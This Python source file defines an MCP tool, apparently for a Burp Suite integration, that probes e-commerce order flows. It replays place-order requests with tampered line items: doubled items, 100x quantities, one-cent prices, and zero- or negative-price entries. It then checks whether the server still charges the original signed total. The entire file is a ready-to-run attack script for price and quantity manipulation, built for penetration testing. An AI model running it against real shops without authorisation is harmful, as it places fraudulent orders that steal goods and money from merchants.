"""probe_line_item_mutation — microservice trust split via mid-flow body mutation.

Common pattern: service A (cart) returns `{items: [...], total: 99}` plus a
signed/opaque token. Service B (order/payment) trusts `total` from A's token
but reads `items` from the client's submitted body. Mutate `items` so they
don't match the signed total — order processes for $99 but ships items worth
$9900.

Strix-derived. Pure black-box; operator provides the two requests (quote/cart
and place-order) and the JSON path of the mutable items list.
"""

import json
from copy import deepcopy

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client


def _get_path(obj, path: list[str]):
    cur = obj
    for p in path:
        if isinstance(cur, dict):
            cur = cur.get(p)
        elif isinstance(cur, list) and p.isdigit():
            idx = int(p)
            cur = cur[idx] if 0 <= idx < len(cur) else None
        else:
            return None
        if cur is None:
            return None
    return cur


def _set_path(obj, path: list[str], value):
    cur = obj
    for p in path[:-1]:
        if isinstance(cur, dict):
            cur = cur.setdefault(p, {})
        elif isinstance(cur, list) and p.isdigit():
            cur = cur[int(p)]
    last = path[-1]
    if isinstance(cur, dict):
        cur[last] = value
    elif isinstance(cur, list) and last.isdigit():
        cur[int(last)] = value


def register(mcp: FastMCP):

    @mcp.tool()
    async def probe_line_item_mutation(
        session: str,
        quote_request: dict,
        place_request: dict,
        items_json_path: str,
        mutation_strategy: str = "all",
    ) -> str:
        """Mutate line items between cart-quote and order-place to find microservice trust mismatch.

        Args:
            session: Auth session.
            quote_request: {method, path, body, headers?} for cart/quote step.
            place_request: {method, path, body, headers?} for place-order step. Body is the canonical content; mutator will substitute items into it.
            items_json_path: Dot-path to the items array in place_request.body, e.g. 'cart.items' or 'items'.
            mutation_strategy: 'all' | 'add_items' | 'inflate_qty' | 'mutate_price' | 'add_zero_price' | 'add_negative'
        """
        headers = {"Content-Type": "application/json"}
        # 1) Quote step
        q_body = quote_request.get("body", {})
        if isinstance(q_body, dict):
            q_body = json.dumps(q_body)
        quote = await client.post("/api/session/request", json={
            "session": session,
            "method": quote_request.get("method", "POST"),
            "path": quote_request["path"],
            "headers": {**headers, **quote_request.get("headers", {})},
            "body": q_body,
        })
        if "error" in quote:
            return f"Error on quote step: {quote['error']}"
        q_status = quote.get("status", 0)
        try:
            q_json = json.loads(quote.get("response_body", "{}"))
        except Exception:
            q_json = {}

        lines = [
            f"probe_line_item_mutation",
            f"[quote] {quote_request.get('method','POST')} {quote_request['path']} status={q_status}",
            f"  quote response keys: {list(q_json.keys()) if isinstance(q_json, dict) else 'non-dict'}",
            "",
        ]

        # Canonical place
        place_body = place_request.get("body", {})
        if isinstance(place_body, str):
            try:
                place_body = json.loads(place_body)
            except Exception:
                return "Error: place_request.body must be JSON-parseable"
        if not isinstance(place_body, dict):
            return "Error: place_request.body must be a JSON object"

        path_parts = items_json_path.split(".")
        items = _get_path(place_body, path_parts)
        if items is None or not isinstance(items, list):
            return f"Error: items not found at path '{items_json_path}' or not a list. body keys: {list(place_body.keys())}"

        canonical_place = await client.post("/api/session/request", json={
            "session": session,
            "method": place_request.get("method", "POST"),
            "path": place_request["path"],
            "headers": {**headers, **place_request.get("headers", {})},
            "body": json.dumps(place_body),
        })
        if "error" in canonical_place:
            return f"Error on canonical place step: {canonical_place['error']}"
        cp_status = canonical_place.get("status", 0)
        cp_body = canonical_place.get("response_body", "")
        cp_len = len(cp_body)
        lines.append(f"[canonical place] status={cp_status} len={cp_len}")

        if not (200 <= cp_status < 300):
            lines.append("\nCanonical place step did not return 2xx. Workflow may be misconfigured.")
            return "\n".join(lines)

        # Mutations
        mutations: list[tuple[str, list]] = []
        if mutation_strategy in ("all", "add_items"):
            extra = deepcopy(items)
            for it in extra:
                if isinstance(it, dict):
                    it["__injected"] = True
            mutations.append(("add_items_doubled", items + extra))
        if mutation_strategy in ("all", "inflate_qty"):
            inflated = deepcopy(items)
            for it in inflated:
                if isinstance(it, dict):
                    for qk in ("qty", "quantity", "count", "amount"):
                        if qk in it and isinstance(it[qk], (int, float)):
                            it[qk] = int(it[qk]) * 100
                            break
            mutations.append(("inflate_qty_100x", inflated))
        if mutation_strategy in ("all", "mutate_price"):
            cheapened = deepcopy(items)
            for it in cheapened:
                if isinstance(it, dict):
                    for pk in ("price", "unit_price", "amount", "cost"):
                        if pk in it and isinstance(it[pk], (int, float)):
                            it[pk] = 0.01
                            break
            mutations.append(("price_to_one_cent", cheapened))
        if mutation_strategy in ("all", "add_zero_price"):
            zeroed = deepcopy(items)
            if zeroed and isinstance(zeroed[0], dict):
                new_item = deepcopy(zeroed[0])
                for pk in ("price", "unit_price", "amount", "cost"):
                    if pk in new_item:
                        new_item[pk] = 0
                        break
                zeroed.append(new_item)
            mutations.append(("add_zero_price_item", zeroed))
        if mutation_strategy in ("all", "add_negative"):
            negated = deepcopy(items)
            if negated and isinstance(negated[0], dict):
                new_item = deepcopy(negated[0])
                for pk in ("price", "unit_price", "amount", "cost"):
                    if pk in new_item and isinstance(new_item[pk], (int, float)):
                        new_item[pk] = -abs(new_item[pk])
                        break
                negated.append(new_item)
            mutations.append(("add_negative_price_item", negated))

        if not mutations:
            return "\n".join(lines) + f"\n\nNo mutations matched strategy '{mutation_strategy}'."

        findings = []
        for name, mutated_items in mutations:
            mutated_body = deepcopy(place_body)
            _set_path(mutated_body, path_parts, mutated_items)
            r = await client.post("/api/session/request", json={
                "session": session,
                "method": place_request.get("method", "POST"),
                "path": place_request["path"],
                "headers": {**headers, **place_request.get("headers", {})},
                "body": json.dumps(mutated_body),
            })
            if "error" in r:
                lines.append(f"  [{name}] error: {r['error']}")
                continue
            s = r.get("status", 0)
            rbody = r.get("response_body", "")
            ln = len(rbody)
            tag = "ACCEPTED" if 200 <= s < 300 else f"rejected({s})"
            lines.append(f"  [{name}] status={s} len={ln} {tag}")
            if 200 <= s < 300:
                # Compare total/amount fields against canonical if present
                try:
                    rj = json.loads(rbody)
                    cj = json.loads(cp_body)
                    same_total = False
                    for k in ("total", "amount", "grand_total", "subtotal", "price"):
                        if k in rj and k in cj and rj[k] == cj[k]:
                            same_total = True
                            break
                    if same_total:
                        findings.append(f"TRUST_SPLIT: {name} mutated items but server returned same total — service trusts quote token, not items array.")
                    else:
                        findings.append(f"ITEMS_RECOMPUTED: {name} accepted; total recomputed from mutated items.")
                except Exception:
                    findings.append(f"ACCEPTED: {name} — verify side effect (order total, shipped items).")

        lines.append("\n--- Summary ---")
        if findings:
            lines.append(f"Findings: {len(findings)}")
            for f in findings:
                lines.append(f"  [!] {f}")
            lines.append("\nVerify by inspecting the persistent order record vs the charged amount.")
        else:
            lines.append("No line-item mutation accepted.")
        return "\n".join(lines)
